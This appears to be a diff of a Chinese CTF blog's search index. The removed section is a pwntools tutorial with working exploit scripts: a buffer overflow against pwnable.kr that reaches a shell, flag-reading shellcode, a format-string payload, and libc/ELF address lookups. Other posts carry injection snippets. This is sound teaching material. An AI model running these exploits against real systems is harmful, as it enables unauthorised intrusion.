-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">    char overflowme[32];</span><br><span class="line">    printf(&quot;overflow me : &quot;);</span><br><span class="line">    gets(overflowme);    // smash me!</span><br><span class="line">    if(key == 0xcafebabe)&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        printf(&quot;Nah..\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">    func(0xdeadbeef);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>pwntools脚本：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">c = remote(&quot;pwnable.kr&quot;, 9000)</span><br><span class="line">c.sendline(&quot;AAAA&quot; * 13 + p32(0xcafebabe))</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>源码简洁明了，我们只需要将key改写成0xcafebabe。</p>
-<p>现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。</p>
-<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code>会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 c). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
-<ul>
-<li><code>send(payload)</code> 发送payload</li>
-<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾\n）</li>
-<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
-<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
-<li><code>recvline()</code> 接收一行输出</li>
-<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
-<li><code>recvuntil(some_string)</code> 接收到 some_string 为止<br>在第三行中,<code>p32()</code>可以让我们转换整数到小端序格式. <code>p32</code>转换4字节. <code>p64</code> 和 <code>p16</code> 则分别转换 8 bit 和 2 bit 数字. <code>c.sendline</code> 将我们的payload发送到远程主机. <code>&quot;AAAA&quot; * 14</code> 是我们到key的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。<h2 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h2>下一题是pwnable.kr的asm. 你需要用 ssh -p2222 <a href="mailto:asm@pwnable.kr" target="_blank" rel="noopener">asm@pwnable.kr</a> 并输入密码 guest 来查看可执行文件和源码. 这里，我们只展示利用代码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = process(&quot;./asm&quot;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;</span><br><span class="line">gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</span><br><span class="line"> </span><br><span class="line">shellcode = shellcraft.amd64.pushstr(&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;)</span><br><span class="line">shellcode += shellcraft.amd64.linux.open(&apos;rsp&apos;,0,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.read(&apos;rax&apos;,&apos;rsp&apos;,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.write(1, &apos;rsp&apos;, 100)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&apos;shellcode: &apos;)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">log.success(p.recvall())</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>我们这里用到了新的api: <code>process()</code>, <code>contex.log_level</code>, <code>gdb.attach</code>, 和 <code>shellcraft</code>.<br>提醒一下，如果你想在命令行中使用<code>gdb.attach()</code>, 便需要安装并运行 tmux.<br><code>process</code> 和 <code>remote</code> 类似. remote 连接远程主机, process 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, process 返回的对象可以通过 gdb.attach(p) 将进程attach到gdb上. Attach 之后, gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编).<br>shellcraft 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 open 了一个文件并 read 文件到 stdout.</p>
-<h2 id="格式化漏洞自动化"><a href="#格式化漏洞自动化" class="headerlink" title="格式化漏洞自动化"></a>格式化漏洞自动化</h2><p>我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import tempfile</span><br><span class="line"> </span><br><span class="line">program = tempfile.mktemp()</span><br><span class="line">source  = program + &quot;.c&quot;</span><br><span class="line">write(source, &apos;&apos;&apos;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#define MEMORY_ADDRESS ((void*)0x11111000)</span><br><span class="line">#define MEMORY_SIZE 1024</span><br><span class="line">#define TARGET ((int *) 0x11111110)</span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">       char buff[1024];</span><br><span class="line">       void *ptr = NULL;</span><br><span class="line">       int *my_var = TARGET;</span><br><span class="line">       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);</span><br><span class="line">       if(ptr != MEMORY_ADDRESS)</span><br><span class="line">       &#123;</span><br><span class="line">               perror(&quot;mmap&quot;);</span><br><span class="line">               return EXIT_FAILURE;</span><br><span class="line">       &#125;</span><br><span class="line">       *my_var = 0x41414141;</span><br><span class="line">       write(1, &amp;my_var, sizeof(int *));</span><br><span class="line">       scanf(&quot;%s&quot;, buff);</span><br><span class="line">       dprintf(2, buff);</span><br><span class="line">       write(1, my_var, sizeof(int));</span><br><span class="line">       return 0;</span><br><span class="line">&#125;&apos;&apos;&apos;)</span><br><span class="line">cmdline = [&quot;gcc&quot;, source, &quot;-Wno-format-security&quot;, &quot;-m32&quot;, &quot;-o&quot;, program]</span><br><span class="line">process(cmdline).wait_for_close()</span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    return p.recvall()</span><br><span class="line"> </span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br><span class="line">p = process(program, stderr=PIPE)</span><br><span class="line">addr = u32(p.recv(4))</span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: 0x1337babe&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print hex(unpack(p.recv(4)))</span><br></pre></td></tr></table></figure>
-
-<p>有了 <code>FmtStr</code>, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 <code>autofmt</code>. 这个对象包含 <code>offset</code>, 即算好的偏移量. <code>fmtstr_payload(offset, {address: value})</code> 帮我们生成最后的payload. 第一个参数 <code>offset</code> 用 <code>autofmt.offset</code> 算好的即可. 然后, 我们需要声明 <code>{address: value}</code> 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址:<code>{address1: value1, address2:value2,..., address: valueN}</code>.</p>
-<p>有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload .<br><a href="http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload</a></p>
-<h2 id="使用-ELF"><a href="#使用-ELF" class="headerlink" title="使用 ELF()"></a>使用 ELF()</h2><p>有些题目给了我们libc. 用 <code>gdb&gt; x function1 — function2</code> 算偏移量太麻烦了, 因此有了 <code>ELF</code>.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">e = ELF(&apos;./example_file&apos;)</span><br><span class="line">print hex(e.address)  # 0x400000</span><br><span class="line">print hex(e.symbols[&apos;write&apos;]) # 0x401680</span><br><span class="line">print hex(e.got[&apos;write&apos;]) # 0x60b070</span><br><span class="line">print hex(e.plt[&apos;write&apos;]) # 0x401680</span><br><span class="line">offset = e.symbols[&apos;system&apos;] - e.symbols[&apos;printf&apos;] # calculate offset</span><br><span class="line">binsh_address = next(e.search(&apos;/bin/sh\x00&apos;)) # find address which contains /bin/sh</span><br></pre></td></tr></table></figure>
-
-<p>和 process() 一样, 我们只用将路径给 ELF(path) 即可分析 ELF.</p>
-<p>我们有以下几种方法操纵ELF:</p>
-<ul>
-<li>symbols[‘a_function’] 找到 a_function 的地址</li>
-<li>got[‘a_function’] 找到 a_function的 got</li>
-<li>plt[‘a_function’] 找到 a_function 的 plt</li>
-<li>next(e.search(“some_characters”)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址.</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>代码审计</title>
     <url>/2019/12/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
-    <content><![CDATA[<h1 id="php函数绕过小结"><a href="#php函数绕过小结" class="headerlink" title="php函数绕过小结"></a>php函数绕过小结</h1><h2 id="0-preg-replace"><a href="#0-preg-replace" class="headerlink" title="0.preg_replace()"></a>0.preg_replace()</h2><p>该函数使用正则表达式来进行匹配特定的字符串.</p>
+    <content><![CDATA[<h1 id="php函数绕过小结"><a href="#php函数绕过小结" class="headerlink" title="php函数绕过小结"></a>php函数绕过小结</h1><a id="more"></a>
+<h2 id="0-preg-replace"><a href="#0-preg-replace" class="headerlink" title="0.preg_replace()"></a>0.preg_replace()</h2><p>该函数使用正则表达式来进行匹配特定的字符串.</p>
 <ul>
 <li>问题代码</li>
 </ul>
@@ -697,7 +704,8 @@
     <title>反序列化</title>
     <url>/2019/12/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="关于phar反序列化"><a href="#关于phar反序列化" class="headerlink" title="关于phar反序列化"></a>关于phar反序列化</h1><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><ul>
-<li>简单的说，phar就是php的压缩文件，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。<br>phar结构由 4 部分组成:</li>
+<li>简单的说，phar就是php的压缩文件，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。<a id="more"></a>
+phar结构由 4 部分组成:</li>
 <li>stub:phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；</li>
 <li>manifest:压缩文件的属性等信息，以序列化存储；</li>
 <li>contents:压缩文件的内容；</li>
@@ -800,6 +808,7 @@
     <url>/2019/12/25/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h1><h2 id="模板注入与常见web注入"><a href="#模板注入与常见web注入" class="headerlink" title="模板注入与常见web注入"></a>模板注入与常见web注入</h2><ul>
 <li><p>就注入类型的漏洞来说，常见 Web 注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。注入漏洞的实质是服务端接受了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。下面这段代码足以说明这一点：</p>
+<a id="more"></a>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// SQL 注入</span><br><span class="line">$query = &quot;select * from sometable where id=&quot;.$_GET[&apos;id&apos;];</span><br><span class="line">mysql_query($query);</span><br><span class="line">------------- 华丽的分割线 -------------</span><br><span class="line">// 模版注入</span><br><span class="line">$temp-&gt;render(&quot;Hello &quot;.$_GET[&apos;username&apos;]);</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
